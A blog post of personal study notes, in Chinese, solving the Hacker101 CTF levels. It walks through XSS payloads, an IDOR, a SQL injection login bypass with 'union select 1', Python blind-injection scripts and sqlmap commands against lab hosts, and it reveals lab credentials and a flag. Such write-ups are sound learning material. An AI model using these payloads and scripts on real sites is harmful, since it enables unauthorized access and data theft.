---
title: "Hacker101"
date: 2019-10-11T16:31:29+08:00
showDate: true
draft: false
tags: ["security","hacker", "ctf"]
categories: ["security"]
---

# hacker101学习笔记

## 前言

记录自己在hacker101 ctf的学习笔记


### 第一关 	A little something to get you started (1/1 flag)

第一次接触ctf没什么经验， 各种看网页源代码，看http请求有点像无头苍蝇，后来看了下hint `Take a look at the source for the page`,然后发现了一个没有出现在页面里的style标签

```html

<style>
	body {background-image: url("background.png");}
</style>
```

试了下访问http://domain.com/background.png，报了404，然后试了试在当前目录加上/background.png，解决


### 第二关 	Micro-CMS v1 （4/4 flag) 

#### flag 1

有了第一关的经验，我大概懂了一些套路，第二关给了一个input框一个textarea标签

![2-1](./2-1.png)

大概猜出来应该是考xss，现在input框里试了一下`<script>alert('xss')</script>`，爆出了第一个flag

![2-2](./2-2.png)

#### flag 2

接着在textarea试了试`<script>alert('xss')</script>`, 虽然提交的是script， 看起来是后端把script替换成scrubbed。 

然后试了一下`<BODY onload="alert('XSS')">`，成功爆出flag

![2-3](./2-3.png)

既然是script被过滤的，那就再试试img标签吧。textarea里写了`<IMG SRC="" onerror="alert('XSS')">`，但是好像和上一个算同一个flag

![2-4](./2-4.png)


#### flag 3

在textarea标签里试了很多种xss，但是flag都是一样的，那看起来接下来的问题就不是考xss了。
里面有一个创建page的页面，试着创建了一个page发现创建出来的page的id好像不连续（初始的两个是1、2，创建的是9），试了下访问`/page/3`，报not found，再试了试`/page/4`，报forbidden，看来这里应该有问题，因为每个page都有一个对应的eidt页面`/page/edit/page_id`，试着访问`/page/edit/4`，出了flag

![2-5](2-5.png)

#### flag 4

第四个flag就有点顺了，访问完`/page/edit/4`，想看看有没有注入点，然后试了试`/page/edit/4'`，最后一个flag就这样出了。

![2-6](2-6.png)

#### 参考资料

[常见xss过滤](https://damit5.com/2017/10/15/XSS-%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/)

### 第三关 Micro-CMS v2 （1/3 flag）

#### flag 1 

这一关一进来就说这是一个之前CMS的升级版本，修复的之前的安全问题，现在edit需要账号密码登录了，看起来是考sql注入吧。
试了试用户名框输入`'`提交，直接报错

```python

Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")

```

从这里大概能看出一些信息比如执行的sql语句是

```sql

SELECT password FROM admins WHERE username='';
```

应该是查用户名的密码然后跟提交的比对，然后数据库是mariadb, 表名是admins

接着试

```sql

' or 1 = 1 #
```

然后提示是invalid passsword， 看起来是username被跳过但是密码因为为空所以错误了。

继续尝试

```sql

' or 1 = 1 and 1 > (select count(*) from admins) #
```

返回了unkonwn user， 说明` 1 > (select count(*) from admins) `为`false`，所以admins表里面只有不多于一条数据，接下来用length猜字段长度

```sql

' or 1 = 1 and 1 > (select count(*) from admins where length(username) = 6) #
' or 1 = 1 and 1 > (select count(*) from admins where length(password) = 6) #
```

说明username和password长度都是6

然后是猜每个位置的字母

```sql

' or 1 = 1 and 1 >  (select count(*) from admins where left(username, 1) = 'a')#
```

手动尝试的话也要几百次，于是尝试下用python写个脚本，核心代码如下，功能为检测某个位置的字母是什么

```python

def get_username_word(idx, a):
    '''

    :param idx: 位置
    :param a: 字母
    :return:
    '''
    url = "http://35.227.24.107/ff1706e3ac/login"
    username = "' or 1 = 1 and 1 >  (select count(*) from admins where left(password, {}) = '{}')#".format(idx, a)
    # username = "mollie"
    # password = "jeanne"
    password = ""

    data = {
        "username": username,
        "password": ""
    }
    r = requests.post(url, data=data)
    if not re.search('Invalid password', r.text):
        print(idx, "is", a)
        return True
    else:
        print(idx, "is not", a)
    return False
```

最后跑出结果

```

    # username = "mollie"
    # password = "jeanne"
```

登陆后拿到flag

![2-7](2-7.png)

#### flag 2

拿到第一个flag之后，找了好久，发现目前可访问的url只有

```

/home       200
/page/1     200
/page/2     200
/page/3     401
/login      200
```

里面也没什么重要的信息，然后尝试访问第一个版本存在的`/page/edit/1`，发现直接重定向到了`/login`，login之后也就只有一个flag并没有后续信息，我尝试把flag当cookie访问`/page/edit/1`,结果还是重定向。

![2-8](2-8.png)

好像卡住了，突然没有了方向。再看了一眼第二关的CMS，它好像有个`POST /page/edit/1`，于是我试了一下POST，果然第二个flag在这。

![2-9](2-9.png)


#### flag 3

找完前两个flag又卡住了，好像现在该找的地方都找了一遍。于是就这样卡了一天，没什么头绪。最后看了两个hint

```

Regular users can only see public pages
Getting admin access might require a more perfect union
```

第一个hint显然说的是`/page/3`这个403的页面，第二个我看到了union，我猜还是在登录界面用注入的方法拿到flag。因为对sql不是很熟悉，所以我仔细查看了一下union的用法，然后在自己的数据库尝试了一下

```

描述
MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。

语法
MySQL UNION 操作符语法格式：

SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions]
UNION [ALL | DISTINCT]
SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions];
```

```sql

SELECT username FROM user 
WHERE username=''
UNION
SELECT 1
```

结果返回为

|username|
|-----|
|1|

这下有了头绪，hint大概是想让我们跳过密码实现登录。回头看一眼他的SQL，

```sql

SELECT password FROM admins WHERE username='';
```

把password查出来然后和post过去的比对，那我只要把他改造成下面这种，查出来的结果和我提交的密码就可以了。

```sql

SELECT password FROM admins
WHERE username=''
UNION
SELECT 1
```

然后提交表单里面填`username=' union select 1#&password=1`就能免密码登录了。试了一下，果然成功了。登录之后就可以访问`/page/3`了。最后一个flag也就在这里。

![2-10](2-10.png)

### 第四关 Encrypted Pastebin


#### 加密这块不是很了解，先放着

### 第五关 Photo Gallery


这关一进去看起来是一个图片展示的网页，三张图片，两个正常显示，一张500，看了下图片的地址。

```url

/fetch?id=1
/fetch?id=2
/fetch?id=3
```

丢到浏览器访问一下，好像直接是出来二进制数据，全是乱码。一开始我以为是要从图片里面找flag，然后尝试用ue打开，然后从里面找flag的16进制，结果什么也没找到。

然后试了试注入，加了一个`'`，200直接变成500，然后试试`' AND 1=1`，还是500，再试了试`AND 1=1`正常了，看来应该是int型的布尔盲注。

网上查了一下盲注的流程

获取数据库名字 -> 获取表名 -> 获取列名 -> 爆字段

我先手工试了一下

```sql 

AND LENGTH(DATABASE())=6
```

返回正常，说明数据库字符长度为6。然后开始用脚本爆数据库名。

```python
def get_available_ascii():
    A = 65
    a = 97
    zero = 48
    for i in [95] + list(range(a, a+26)) + list(range(A, A+26)) + list(range(zero, zero+10)):
        yield i


def guess_database_length(url):
    payload = " AND LENGTH(DATABASE())={}"
    for i in range(1, 33):
        u = url + payload.format(i)
        print(u)
        r = requests.head(u)
        print(r.status_code)
        if r.status_code == 200:
            return i

def guess_database_name(url, length):
    payload = " AND ASCII(MID(DATABASE(), {}, 1))={}"
    database_name = ""
    for pos in range(1, length+1):
        for s in get_available_ascii():
            u = url + payload.format(pos, s)
            r = requests.head(u)
            print(r.status_code)
            if r.status_code == 200:
                print(pos, chr(s))
                database_name += chr(s)
                break
    return database_name
```

这里用head方法是因为这个网站只需要知道响应码就ok了，这样可以提高请求的速度。

得到`database_name = 'level5'`

然后猜表

```python
def guess_database_tables(url, database_name):
    table1_length = 6 # 浏览器手工注入结果
    table2_length = 6
    tables = []
    payload = " AND ASCII(MID((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' limit {}, 1), {}, 1))={}"
    for table_idx in range(2):
        table_name = ""
        for table_pos_idx in range(1, table1_length + 1):
            for s in get_available_ascii():
                u = url + payload.format(database_name, table_idx, table_pos_idx, s)
                r = requests.head(u)
                print(r.status_code)
                if r.status_code == 200:
                    print("table", table_idx, table_pos_idx, chr(s))
                    table_name += chr(s)
                    break
        tables.append(table_name)
    return tables
```

表长是手工注入的时候得到的，这里就直接当常量用了，最后得到结果为

```python

table0 = "albums"
table1 = "photos"
```

做到这一步，我打算直接上sqlmap了。kali启动~

先爆第一个表albums的字段

```bash
sqlmap --threads 10 -u "http://35.227.24.107/479b051cb9/fetch?id=1" -D level5 -T albums --columns

```

结果为

| Column | Type    |
|--------|---------|
| id     | int(11) |
| title  | text    |

接着爆数据

```bash
sqlmap --threads 10 -u "http://35.227.24.107/479b051cb9/fetch?id=1" -D level5 -T albums -C id,title --dump
```

看起来只有一条没什么用的数据

| id | title   |
|----|---------|
| 1  | Kittens |

接着下一个表photos爆出来的数据如下

| id | parent | title            | filename                                                         |
|----|--------|------------------|------------------------------------------------------------------|
| 1  | 1      | Utterly adorable | files/adorable.jpg                                               |
| 2  | 1      | Purrfect         | files/purrfect.jpg                                               |
| 3  | 1      | Invisible        | c46d5ba4cb81f5f75c59e560a1345c5b417b961616b8e98f48e75306a81439a6 |

看来之所以`/fetch?id=3`返回500是因为3的filename的文件不存在导致的吧。这看起来是一个64位md5，我放到cmd5上解密，没有结果。第二天早上起来我想了想，这玩意儿和flag长得也很像，于是就把他改成flag的格式

`^FLAG^c46d5ba4cb81f5f75c59e560a1345c5b417b961616b8e98f48e75306a81439a6$FLAG$`

提交发现果然是个flag。

未完待续~


